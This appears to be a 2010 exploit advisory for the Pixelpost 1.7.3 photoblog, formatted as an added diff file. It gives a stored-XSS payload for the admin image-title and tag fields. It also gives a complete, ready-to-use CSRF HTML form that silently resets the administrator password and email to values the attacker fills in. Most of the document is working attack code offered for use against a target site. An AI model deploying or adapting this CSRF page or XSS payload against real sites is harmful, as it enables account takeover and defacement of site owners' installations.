@@ -1,0 +1,66 @@
+1  [+]Exploit Title: pixelpost_v1.7.3 Multiple vulnerabilities         0
+0  [+]Date: 15/09/2010                                                 1
+1  [+]Author: Sweet                                                    0
+0  [+]Contact : charif38@hotmail.fr                                    0
+1  [+]Software Link:  http://www.pixelpost.org/                        0
+0  [+]Download: http://www.pixelpost.org/                              1
+1  [+]Version: 1.7.3                                                   0
+0  [+]Tested on: WinXp sp3                                             1
+1  [+]Risk :Hight                                                      0
+0  [+]Description :                                                    0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+---=Stored Xss=---
+admin login required
+
+in http://www.target.com/path/admin/index.php? the post variable "Image Title" and "tags" are vulnerable to a stored Xss
+
+attack pattern:>"<script>alert("sweet")</script>
+
+---=CSRF change admin password=--- 
+<html>
+<body>
+<h1>Pixelpost_v1.7.3 change admin password CSRF by Sweet </h1>
+<form method="POST" name="form0" action="http://www.target.com/path/admin/index.php?view=options&optaction=updateall">
+<input type="hidden" name="new_site_title" value="Pixelpost"/>
+<input type="hidden" name="new_sub_title" value="Authentic photoblog flavour"/>
+<input type="hidden" name="new_site_url" value="http://www.target.com/path/"/>
+<input type="hidden" name="new_admin_user" value="admin"/>
+<input type="hidden" name="newadminpass" value="password"/> <!-- Your password here -->
+<input type="hidden" name="newadminpass_re" value="password"/> <!-- Your password here -->
+<input type="hidden" name="passchanged" value="no"/>
+<input type="hidden" name="new_lang" value="english"/>
+<input type="hidden" name="alt_lang" value="Off"/>
+<input type="hidden" name="new_admin_lang" value="english"/>
+<input type="hidden" name="new_email" value="charif38@hotmail.fr"/><!-- Your Email here here -->
+<input type="hidden" name="new_image_path" value="../images/"/>
+<input type="hidden" name="new_thumbnail_path" value="../thumbnails/"/>
+<input type="hidden" name="timezone" value="0"/>
+<input type="hidden" name="global_comments" value="A"/>
+<input type="hidden" name="new_commentemail" value="no"/>
+<input type="hidden" name="new_htmlemailnote" value="yes"/>
+<input type="hidden" name="timestamp" value="yes"/>
+<input type="hidden" name="visitorbooking" value="yes"/>
+<input type="hidden" name="markdown" value="F"/>
+<input type="hidden" name="exif" value="T"/>
+<input type="hidden" name="feed_title" value="Pixelpost"/>
+<input type="hidden" name="feed_description" value="Authentic photoblog flavour"/>
+<input type="hidden" name="feed_copyright" value="Copyright 2010 http://www.target.com/path/, All Rights Reserved"/>
+<input type="hidden" name="feed_discovery" value="RA"/>
+<input type="hidden" name="feed_external_type" value="ER"/>
+<input type="hidden" name="feed_external" value=""/>
+<input type="hidden" name="allow_comment_feed" value="Y"/>
+<input type="hidden" name="rsstype" value="T"/>
+<input type="hidden" name="feeditems" value="10"/>
+<input type="hidden" name="display_sort_by" value="datetime"/>
+<input type="hidden" name="display_order" value="default"/>
+<p> Push the button <input type="submit" name="update" value="GO!"/></p>
+</form>
+</body>
+</html>
+
+thx to Milw0rm.com , JF - Hamst0r - Keystroke  , inj3ct0r.com , exploit-db.com
+
+
+1,2,3 viva L'Algerie :))
+
